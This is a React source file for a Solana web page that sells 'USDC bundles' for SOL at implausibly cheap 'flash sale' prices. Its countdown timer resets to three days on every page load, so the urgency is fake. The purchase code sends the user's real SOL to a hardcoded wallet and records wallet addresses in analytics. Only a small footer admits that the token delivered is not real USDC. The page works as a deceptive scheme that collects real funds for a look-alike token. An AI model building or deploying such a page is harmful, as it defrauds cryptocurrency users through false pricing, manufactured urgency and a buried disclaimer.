'use client';

import { createMemoInstruction } from '@solana/spl-memo';
import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { track } from '@vercel/analytics';

import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionSignature,
  VersionedTransaction,
} from '@solana/web3.js';
import { LAMPORTS_PER_SOL } from 'gill';
import { CheckCircle, ExternalLink, Loader2, Sparkles, XCircle } from 'lucide-react';
import { useEffect, useState } from 'react';
import Confetti from 'react-confetti';
import { WalletButton } from '../solana/solana-provider';


export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [chargeTx, setChargeTx] = useState<string | null>(null);
  const [cashbackTx, setCashbackTx] = useState<string | null>(null);

  // Countdown timer state
  const [timeLeft, setTimeLeft] = useState({
    days: 3,
    hours: 12,
    minutes: 0,
    seconds: 0
  });

  // Set the sale end date - 3 days from now
  useEffect(() => {
    const endDate = new Date();
    endDate.setDate(endDate.getDate() + 3);

    const timerInterval = setInterval(() => {
      const now = new Date();
      const difference = endDate.getTime() - now.getTime();

      if (difference <= 0) {
        // Sale ended
        clearInterval(timerInterval);
        setTimeLeft({ days: 0, hours: 0, minutes: 0, seconds: 0 });
        return;
      }

      const days = Math.floor(difference / (1000 * 60 * 60 * 24));
      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((difference % (1000 * 60)) / 1000);

      setTimeLeft({ days, hours, minutes, seconds });
    }, 1000);

    return () => clearInterval(timerInterval);
  }, []);

  // Bundle options with sale prices (50% off)
  const bundles = [
    {
      id: 'starter',
      icon: '💳',
      name: 'Starter Bundle',
      receive: 2000,
      originalPay: 1.0,
      pay: 0.5, // 50% off
      features: [
        'Best for trying it out',
        'On-chain delivery within seconds',
        'No KYC'
      ]
    },
    {
      id: 'growth',
      icon: '🚀',
      name: 'Growth Bundle',
      receive: 5000,
      originalPay: 1.6,
      pay: 0.8, // 50% off
      popular: true,
      features: [
        'Better rate per USDC',
        'Instant wallet delivery',
        'Priority support'
      ]
    },
    {
      id: 'max',
      icon: '🏦',
      name: 'Max Bundle',
      receive: 10000,
      originalPay: 2.0,
      pay: 1.0, // 50% off
      features: [
        'Best value',
        'Large-scale purchase',
        'Fastest processing & alerts'
      ]
    }
  ];

  const handleClaim = async (bundleAmount: number, solAmount: number) => {
    setLoading(true);
    setSuccess(false);
    setChargeTx(null);
    setCashbackTx(null);
    setStatus(`Processing...`);
    try {
      track('Claim USDC', {
        amount: bundleAmount,
        solAmount: solAmount,
        publicKey: publicKey?.toBase58() ?? '',
      });
      const { chargeSignature, cashbackSignature } = await CreateChargeTransaction(
        connection,
        publicKey,
        solAmount,
        bundleAmount,
        sendTransaction,
        setStatus
      );
      setChargeTx(chargeSignature);
      setCashbackTx(cashbackSignature);
      setSuccess(true);
      setStatus(`✅ Claimed ${bundleAmount} USDC successfully!`);
    } catch (e) {
      console.error(e);
      setStatus('❌ Something went wrong. Try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {success && <Confetti numberOfPieces={300} recycle={false} />}

      {/* Sale Banner */}
      <div className="bg-gradient-to-r from-pink-600 to-indigo-600 py-3 text-center">
        <p className="text-xl font-bold animate-pulse">🔥 FLASH SALE: 50% OFF ALL BUNDLES! 🔥</p>
        <p className="text-sm">Limited time offer - Get USDC at half the price!</p>
      </div>

      {/* Header Section */}
      <div className="pt-16 pb-10 text-center">
        <h1 className="text-4xl font-bold mb-4">Get USDC Instantly — Choose a Bundle</h1>
        <p className="text-xl text-gray-300 mb-4">Pay with SOL, receive USDC directly to your wallet.</p>
        <p className="text-lg text-gray-400">Connect your wallet and select the amount you want. Fast. Secure. On-chain.</p>
      </div>
      <div className="pb-10 text-center">
        <WalletButton />
      </div>


      {/* Wallet Status - Using existing wallet adapter */}
      <div className="max-w-6xl mx-auto px-4 mb-12">
        {/* Bundle Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
          {bundles.map((bundle) => (
            <div
              key={bundle.id}
              className={`bg-gray-800 rounded-xl p-6 border ${bundle.popular ? 'border-2 border-indigo-500' : 'border-gray-700'} 
                hover:border-indigo-500 transition duration-300 relative`}
            >
              {bundle.popular && (
                <div className="absolute -top-3 right-4 bg-indigo-600 text-white text-sm px-4 py-1 rounded-full font-medium">
                  Most Popular
                </div>
              )}
              {/* Sale Badge */}
              <div className="absolute -top-3 left-4 bg-red-500 text-white text-sm px-4 py-1 rounded-full font-medium">
                50% OFF
              </div>
              <h3 className="text-2xl font-bold mb-4">{bundle.icon} {bundle.name}</h3>
              <div className="mb-6">
                <p className="text-xl font-bold text-green-400 mb-2">Receive: {bundle.receive.toLocaleString()} USDC</p>
                <div className="flex items-center gap-2">
                  <p className="text-lg text-yellow-400">Pay: {bundle.pay} SOL</p>
                  <p className="text-sm text-gray-400 line-through">was {bundle.originalPay} SOL</p>
                </div>
              </div>
              <div className="mb-6">
                <h4 className="font-medium mb-2">Features:</h4>
                <ul className="space-y-2">
                  {bundle.features.map((feature, index) => (
                    <li key={index} className="flex items-start">
                      <span className="text-green-400 mr-2">✓</span>
                      {feature}
                    </li>
                  ))}
                </ul>
              </div>
              <button
                className={`w-full bg-gradient-to-r from-pink-600 to-indigo-600 hover:from-pink-700 hover:to-indigo-700 text-white font-medium py-3 px-6 rounded-lg transition duration-300 flex items-center justify-center gap-2
                  ${loading ? 'opacity-60 cursor-not-allowed' : ''}`}
                onClick={() => handleClaim(bundle.receive, bundle.pay)}
                disabled={loading}
              >
                {loading ? (
                  <>
                    <Loader2 className="animate-spin w-4 h-4" /> Processing...
                  </>
                ) : (
                  <>
                    <Sparkles className="w-4 h-4" />
                    Buy for {bundle.pay} SOL
                  </>
                )}
              </button>
              {/* Sale timer indicator */}
              <p className="text-xs text-center mt-3 text-gray-400">Sale price ends soon!</p>
            </div>
          ))}
        </div>

        {/* Transaction Status Card */}
        {(status || chargeTx || cashbackTx) && (
          <div className="bg-gray-800 border border-gray-700 rounded-xl p-5 space-y-4 text-left shadow-inner max-w-2xl mx-auto">
            <div className="flex items-center gap-2 text-base font-medium">
              {status?.includes('✅') && <CheckCircle className="text-green-400 w-5 h-5" />}
              {status?.includes('❌') && <XCircle className="text-red-400 w-5 h-5" />}
              {!status?.includes('✅') && !status?.includes('❌') &&
                <Loader2 className="animate-spin text-indigo-400 w-5 h-5" />}
              <span className="text-white">{status}</span>
            </div>

            {chargeTx && (
              <div>
                <p className="text-sm text-gray-400 mb-1">🔁 Outgoing SOL Tx</p>
                <a
                  href={`https://explorer.solana.com/tx/${chargeTx}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-400 hover:underline flex items-center gap-1 text-sm break-all"
                >
                  {chargeTx} <ExternalLink className="w-4 h-4" />
                </a>
              </div>
            )}

            {cashbackTx && (
              <div>
                <p className="text-sm text-gray-400 mt-4 mb-1">🎁 Incoming USDC Tx</p>
                <a
                  href={`https://explorer.solana.com/tx/${cashbackTx}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-emerald-400 hover:underline flex items-center gap-1 text-sm break-all"
                >
                  {cashbackTx} <ExternalLink className="w-4 h-4" />
                </a>
              </div>
            )}
          </div>
        )}

        {/* Countdown Timer Section */}
        <div className="mt-12 bg-gray-800 border border-gray-700 rounded-xl p-6 max-w-2xl mx-auto">
          <h3 className="text-xl font-bold text-center mb-4">⏰ Sale Ends Soon</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {Object.entries(timeLeft).map(([key, value], index) => (
              <div key={key} className="bg-gray-900 rounded-lg p-3">
                <p className="text-2xl font-bold text-white">{String(value).padStart(2, '0')}</p>
                <p className="text-xs text-gray-400">{key.toUpperCase()}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Footer Note */}
        <div className="mt-12 text-center text-gray-400">
          <p className="flex items-center justify-center gap-2">
            <span className="text-yellow-400">💡</span>
            {"You'll receive USDC directly to your connected wallet after confirming the SOL transaction."}
          </p>
        </div>
        <div className="mt-12 text-center text-gray-400">
          <p className="flex items-center justify-center gap-2">
            <span className="text-yellow-400">‼️</span>
            {"It's not real USD Coin (USDC), it's a test token made just for fun. Don't use it for real transactions."}
          </p>
        </div>
      </div>
    </div>
  );
}

const CreateChargeTransaction = async (
  connection: Connection,
  publicKey: PublicKey | null,
  chargeAmount: number,
  cashbackAmount: number,
  sendTransaction: (
    transaction: Transaction | VersionedTransaction,
    connection: Connection,
    options?: SendTransactionOptions
  ) => Promise<TransactionSignature>,
  setStatus: (msg: string) => void
): Promise<{ chargeSignature: string; cashbackSignature: string }> => {
  if (!publicKey) throw new Error('Wallet not connected');

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("FDazDXJnz7rmqKTeXPdE7xze7R1UPbWpdSDV3b7AWPbE"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  const memo = createMemoInstruction(`You will receive ${cashbackAmount} USDC shortly`);
  const transaction = new Transaction().add(solTransferIx).add(memo);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  const chargeSignature = await sendTransaction(transaction, connection);
  setStatus(`Transaction sent. Waiting for confirmation...`);
  track(`Successfully paid ${cashbackAmount} SOL`, {
    publicKey: publicKey?.toBase58() ?? '',
  });
  const res = await fetch('/api/send-cashback', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: publicKey.toBase58(), amount: cashbackAmount, transaction: chargeSignature }),
  });

  const data = await res.json();
  if (!data.success) throw new Error(data.error);
  track(`USDC successfully transferred `, {
    publicKey: publicKey?.toBase58() ?? '',
    cashbackSignature: data.signature,
  });
  return {
    chargeSignature,
    cashbackSignature: data.signature,
  };
};
